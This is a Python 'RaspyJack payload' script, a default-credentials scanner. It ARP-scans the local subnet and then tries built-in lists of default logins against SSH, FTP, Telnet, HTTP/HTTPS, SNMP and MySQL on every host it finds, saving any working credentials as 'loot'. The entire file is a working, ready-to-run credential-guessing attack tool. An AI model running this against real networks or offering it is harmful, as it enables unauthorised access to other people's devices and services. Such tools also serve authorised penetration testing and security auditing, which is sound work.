#!/usr/bin/env python3
# @name: Default Credentials Scanner
# @desc: Auto-discovers hosts via ARP scan, then probes common services (SSH, FTP, Telnet, HTTP, SNMP, MySQL) with built-in default creds.
# @category: credentials
# @danger: true
# @active: true
# @web: true
"""
RaspyJack Payload -- Default Credentials Scanner
=================================================
Author: 7h30th3r0n3

Auto-discovers hosts via ARP scan, then probes common services
(SSH, FTP, Telnet, HTTP, SNMP, MySQL) with built-in default creds.

Prerequisites: sshpass, scapy, requests

Controls:
  python3 default_creds_scanner.py

  No arguments. If more than one network interface is present, you'll
  be prompted to pick one before the scan starts (a single interface
  is auto-selected). Progress is printed as hosts and services are
  probed; results are printed as they are found and exported to loot
  when the scan finishes (or is interrupted with Ctrl-C).

Loot: $CITYPOP_ROOT/loot/DefaultCreds/creds_TIMESTAMP.json
"""

from payloads._web_input import request_input
import os, sys, json, time, socket, ftplib, threading, subprocess, ipaddress
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

from payloads._iface_helper import list_interfaces

# ---------------------------------------------------------------------------
LOOT_DIR = os.path.join(os.environ.get("CITYPOP_ROOT", os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))), 'loot', 'DefaultCreds')
RATE_LIMIT = 1.0
CONN_TIMEOUT = 3

# ---------------------------------------------------------------------------
# Built-in credential lists per protocol
# ---------------------------------------------------------------------------
SSH_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", "default"),
    ("admin", "changeme"), ("admin", "admin123"), ("admin", ""),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", "12345"), ("root", "123456"),
    ("root", ""), ("root", "changeme"), ("root", "letmein"),
    ("pi", "raspberry"), ("pi", "raspberrypi"), ("pi", "password"),
    ("ubnt", "ubnt"), ("ubuntu", "ubuntu"), ("user", "user"),
    ("support", "support"), ("cisco", "cisco"), ("vagrant", "vagrant"),
    ("test", "test"), ("oracle", "oracle"), ("guest", "guest"),
]
FTP_CREDS = [
    ("anonymous", ""), ("anonymous", "anonymous"), ("anonymous", "guest"),
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "default"), ("admin", "ftp"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", ""), ("ftp", "ftp"),
    ("ftpuser", "ftpuser"), ("ftpuser", "password"), ("ftpuser", "ftp"),
    ("user", "user"), ("user", "password"), ("test", "test"),
    ("guest", "guest"), ("backup", "backup"), ("upload", "upload"),
    ("web", "web"), ("www", "www"), ("data", "data"),
]
TELNET_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "default"), ("admin", "changeme"), ("admin", "admin123"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "1234"), ("root", ""), ("root", "changeme"),
    ("user", "user"), ("user", "password"), ("guest", "guest"),
    ("cisco", "cisco"), ("enable", "enable"), ("support", "support"),
    ("operator", "operator"), ("monitor", "monitor"), ("manager", "manager"),
    ("tech", "tech"), ("service", "service"), ("debug", "debug"),
    ("ubnt", "ubnt"), ("pi", "raspberry"), ("test", "test"),
]
HTTP_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
    ("admin", "12345"), ("admin", "123456"), ("admin", ""),
    ("admin", "changeme"), ("admin", "default"), ("admin", "admin123"),
    ("root", "root"), ("root", "password"), ("root", "1234"),
    ("root", ""), ("root", "toor"), ("user", "user"),
    ("user", "password"), ("guest", "guest"), ("operator", "operator"),
    ("manager", "manager"), ("supervisor", "supervisor"),
    ("admin", "pass"), ("admin", "letmein"), ("admin", "welcome"),
    ("admin", "admin1"), ("admin", "test"), ("web", "web"),
    ("monitor", "monitor"), ("support", "support"), ("cisco", "cisco"),
    ("ubnt", "ubnt"),
]
SNMP_COMMUNITIES = [
    "public", "private", "community", "snmp", "default",
    "read", "write", "monitor", "admin", "manager",
    "test", "cisco", "router", "switch", "network",
    "secret", "access", "system", "all", "ILMI",
    "cable-docsis", "internal", "private-access", "public-access",
    "mngt", "security", "C0de", "SNMP", "rmon", "1234",
]
MYSQL_CREDS = [
    ("root", ""), ("root", "root"), ("root", "password"),
    ("root", "mysql"), ("root", "1234"), ("root", "12345"),
    ("root", "123456"), ("root", "toor"), ("root", "admin"),
    ("root", "changeme"), ("root", "default"), ("root", "test"),
    ("admin", "admin"), ("admin", "password"), ("admin", ""),
    ("admin", "1234"), ("admin", "mysql"), ("mysql", "mysql"),
    ("mysql", "password"), ("mysql", ""), ("user", "user"),
    ("user", "password"), ("test", "test"), ("test", ""),
    ("dba", "dba"), ("db", "db"), ("dbadmin", "dbadmin"),
    ("guest", "guest"), ("backup", "backup"), ("monitor", "monitor"),
]

SERVICES = [
    (22,   "SSH",      SSH_CREDS),
    (21,   "FTP",      FTP_CREDS),
    (23,   "Telnet",   TELNET_CREDS),
    (80,   "HTTP",     HTTP_CREDS),
    (8080, "HTTP8080", HTTP_CREDS),
    (443,  "HTTPS",    HTTP_CREDS),
    (161,  "SNMP",     [(c, "") for c in SNMP_COMMUNITIES]),
    (3306, "MySQL",    MYSQL_CREDS),
]

# ---------------------------------------------------------------------------
# Shared state
# ---------------------------------------------------------------------------
lock = threading.Lock()
running = True
scanning = False
hosts = []
results = []          # {"host","port","service","user","pass","status"}
current_host_idx = 0
total_hosts = 0
current_service = ""
current_cred = ""
tests_done = 0

# ---------------------------------------------------------------------------
# Network helpers
# ---------------------------------------------------------------------------

def _detect_subnet():
    for iface in ("eth0", "wlan0", "usb0"):
        try:
            res = subprocess.run(["ip", "-4", "addr", "show", iface],
                                 capture_output=True, text=True, timeout=5)
            for line in res.stdout.splitlines():
                s = line.strip()
                if s.startswith("inet "):
                    return s.split()[1]
        except Exception:
            pass
    return None


def _arp_scan(cidr):
    try:
        from scapy.all import ARP, Ether, srp
    except ImportError:
        _set_status("scapy not installed!")
        return []
    try:
        net = ipaddress.IPv4Network(cidr, strict=False)
    except ValueError:
        return []
    _set_status(f"ARP scan {net}...")
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(net)),
                      timeout=3, verbose=False)
    except Exception:
        return []
    return sorted([r[ARP].psrc for _, r in ans],
                  key=lambda ip: ipaddress.IPv4Address(ip))


def _port_open(host, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        ok = s.connect_ex((host, port)) == 0
        s.close()
        return ok
    except Exception:
        return False


def _set_status(msg):
    print(f"[*] {msg}", flush=True)

# ---------------------------------------------------------------------------
# Protocol testers
# ---------------------------------------------------------------------------

def _test_ssh(host, user, pw):
    try:
        res = subprocess.run(
            ["sshpass", "-p", pw, "ssh",
             "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null",
             "-o", "ConnectTimeout=3",
             "-o", "BatchMode=no",
             f"{user}@{host}", "echo", "ok"],
            capture_output=True, text=True, timeout=8)
        return res.returncode == 0 and "ok" in res.stdout
    except Exception:
        return False


def _test_ftp(host, user, pw):
    try:
        ftp = ftplib.FTP()
        ftp.connect(host, 21, timeout=CONN_TIMEOUT)
        ftp.login(user, pw)
        ftp.quit()
        return True
    except Exception:
        return False


def _drain(sock):
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
    except (socket.timeout, OSError):
        pass
    return data.decode("latin-1", errors="replace")


def _test_telnet(host, user, pw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        s.connect((host, 23))
        time.sleep(0.5)
        _drain(s)
        s.sendall((user + "\r\n").encode())
        time.sleep(0.5)
        _drain(s)
        s.sendall((pw + "\r\n").encode())
        time.sleep(1.0)
        resp = _drain(s).lower()
        s.close()
        if any(k in resp for k in ["incorrect", "denied", "failed", "invalid"]):
            return False
        return any(k in resp for k in ["$", "#", ">", "welcome", "last login"])
    except Exception:
        return False


def _test_http(host, port, user, pw):
    try:
        import requests
    except ImportError:
        return False
    scheme = "https" if port == 443 else "http"
    try:
        r = requests.get(f"{scheme}://{host}:{port}/",
                         auth=(user, pw), timeout=CONN_TIMEOUT, verify=False)
        return r.status_code < 400
    except Exception:
        return False


def _test_snmp(host, community):
    try:
        from scapy.all import IP, UDP, SNMP, SNMPget, SNMPvarbind, ASN1_OID, sr1
    except ImportError:
        return False
    try:
        pkt = (IP(dst=host) / UDP(sport=40000, dport=161)
               / SNMP(community=community,
                      PDU=SNMPget(varbindlist=[
                          SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))])))
        reply = sr1(pkt, timeout=2, verbose=False)
        return reply and reply.haslayer(SNMP) and int(reply[SNMP].PDU.error) == 0
    except Exception:
        return False


def _test_mysql(host, user, pw):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(CONN_TIMEOUT)
        s.connect((host, 3306))
        g = s.recv(4096)
        s.close()
        if not g or len(g) < 4:
            return False
        cmd = ["mysql", f"-h{host}", f"-u{user}",
               f"-p{pw}" if pw else "--skip-password",
               "-e", "SELECT 1;"]
        return subprocess.run(cmd, capture_output=True, text=True,
                              timeout=8).returncode == 0
    except Exception:
        return False

# ---------------------------------------------------------------------------
# Dispatcher
# ---------------------------------------------------------------------------

def _test_cred(host, port, svc, user, pw):
    """Returns 'found', 'locked', or 'none'."""
    try:
        testers = {
            "SSH": lambda: _test_ssh(host, user, pw),
            "FTP": lambda: _test_ftp(host, user, pw),
            "Telnet": lambda: _test_telnet(host, user, pw),
            "SNMP": lambda: _test_snmp(host, user),
            "MySQL": lambda: _test_mysql(host, user, pw),
        }
        if svc in ("HTTP", "HTTP8080", "HTTPS"):
            return "found" if _test_http(host, port, user, pw) else "none"
        fn = testers.get(svc)
        return "found" if fn and fn() else "none"
    except Exception:
        return "locked"

# ---------------------------------------------------------------------------
# Scan
# ---------------------------------------------------------------------------

def _scan_all():
    global scanning, current_host_idx, total_hosts
    global current_service, current_cred, tests_done

    scanning = True
    cidr = _detect_subnet()
    if not cidr:
        _set_status("No network found!")
        scanning = False
        return

    discovered = _arp_scan(cidr)
    if not discovered:
        _set_status("No hosts found")
        scanning = False
        return

    with lock:
        hosts.clear()
        hosts.extend(discovered)
        total_hosts = len(discovered)
    _set_status(f"Found {total_hosts} host(s)")

    for h_idx, host in enumerate(discovered):
        if not running:
            break
        with lock:
            current_host_idx = h_idx + 1
        _set_status(f"Host {h_idx + 1}/{total_hosts}: {host}")

        for port, svc, cred_list in SERVICES:
            if not running:
                break
            with lock:
                current_service = svc

            if not _port_open(host, port):
                continue

            print(f"[*]   {svc} open on {host}:{port}, testing "
                  f"{len(cred_list)} credential pair(s)...", flush=True)

            for user, pw in cred_list:
                if not running:
                    break
                with lock:
                    current_cred = (f"community={user}" if svc == "SNMP"
                                    else f"{user}:{pw}")
                    tests_done += 1

                result = _test_cred(host, port, svc, user, pw)
                if result in ("found", "locked"):
                    entry = {
                        "host": host, "port": port, "service": svc,
                        "user": user, "pass": pw, "status": result,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    }
                    with lock:
                        results.append(entry)
                    cred_str = f"community={user}" if svc == "SNMP" else f"{user}:{pw}"
                    tag = "FOUND" if result == "found" else "LOCKED"
                    print(f"[+] {tag}: {svc} {host}:{port} {cred_str}", flush=True)
                    break  # next service
                time.sleep(RATE_LIMIT)

    with lock:
        fc = sum(1 for r in results if r["status"] == "found")
    print(f"[*] Scan complete. {fc} credential(s) found.", flush=True)
    scanning = False


def _save_results():
    os.makedirs(LOOT_DIR, exist_ok=True)
    with lock:
        copy = list(results)
    if not copy:
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = os.path.join(LOOT_DIR, f"creds_{ts}.json")
    report = {
        "scan_time": ts, "hosts_scanned": len(hosts),
        "credentials_found": [r for r in copy if r["status"] == "found"],
        "locked_out": [r for r in copy if r["status"] == "locked"],
    }
    try:
        with open(path, "w") as fh:
            json.dump(report, fh, indent=2)
        _set_status(f"Saved {os.path.basename(path)}")
    except Exception as e:
        _set_status(f"Save err: {e}")

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    global running

    if "-h" in sys.argv or "--help" in sys.argv:
        print("Usage: python3 default_creds_scanner.py", flush=True)
        return 0

    ifaces = list_interfaces("any")
    if not ifaces:
        print("[!] No network interface found.", flush=True)
        return 1

    if len(ifaces) == 1:
        selected_iface = ifaces[0]["name"]
    else:
        print(f"[*] {len(ifaces)} network interface(s) found:", flush=True)
        for i, ifc in enumerate(ifaces, 1):
            ip = f" ({ifc['ip']})" if ifc["ip"] else ""
            print(f"  {i}. {ifc['name']}{ip}", flush=True)
        choice = request_input(f"Select an interface [1-{len(ifaces)}]: ").strip()
        try:
            idx = int(choice) - 1
            if idx < 0 or idx >= len(ifaces):
                raise ValueError
        except ValueError:
            print("[!] Invalid selection.", flush=True)
            return 1
        selected_iface = ifaces[idx]["name"]

    print(f"[*] Using interface {selected_iface}", flush=True)
    print("[*] Default Credentials Scanner -- ARP scan + probe "
          "SSH/FTP/Telnet/HTTP/SNMP/MySQL", flush=True)

    try:
        _scan_all()
    except KeyboardInterrupt:
        running = False
        print("\n[*] Interrupted.", flush=True)
    finally:
        running = False
        with lock:
            fc = sum(1 for r in results if r["status"] == "found")
            lc = sum(1 for r in results if r["status"] == "locked")
        print(f"[*] Scan stopped. {fc} credential(s) found, "
              f"{lc} locked out.", flush=True)
        _save_results()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
